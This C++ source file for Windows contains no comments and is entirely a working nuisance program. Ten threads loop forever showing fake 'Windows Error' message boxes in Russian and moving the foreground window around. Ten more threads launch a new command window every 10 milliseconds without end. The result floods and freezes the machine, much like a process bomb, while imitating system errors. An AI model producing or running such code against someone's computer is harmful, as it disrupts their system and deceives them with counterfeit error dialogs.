#include <windows.h>
#include <iostream>
#include <cstdlib>
#include <ctime>
#include <thread>
#include <vector>

void ShowRandomError() {
    while (true) {
        int x = rand() % GetSystemMetrics(SM_CXSCREEN);
        int y = rand() % GetSystemMetrics(SM_CYSCREEN);
        for (int i = 0; i < 5; ++i) {
            MessageBox(NULL, L"Произошла ошибка!", L"Ошибка Windows", MB_ICONERROR | MB_OK);
        }
        HWND hwnd = GetForegroundWindow();
        SetWindowPos(hwnd, NULL, x, y, 0, 0, SWP_NOSIZE | SWP_NOZORDER);
        Sleep(10);
    }
}

void OpenConsoles() {
    while (true) {
        system("start cmd");
        Sleep(10);
    }
}

int main() {
    srand(static_cast<unsigned int>(time(0)));

    std::vector<std::thread> errorThreads;
    for (int i = 0; i < 10; ++i) {
        errorThreads.emplace_back(ShowRandomError);
    }

    std::vector<std::thread> consoleThreads;
    for (int i = 0; i < 10; ++i) {
        consoleThreads.emplace_back(OpenConsoles);
    }

    for (auto& thread : errorThreads) {
        thread.join();
    }
    for (auto& thread : consoleThreads) {
        thread.join();
    }

    return 0;
}
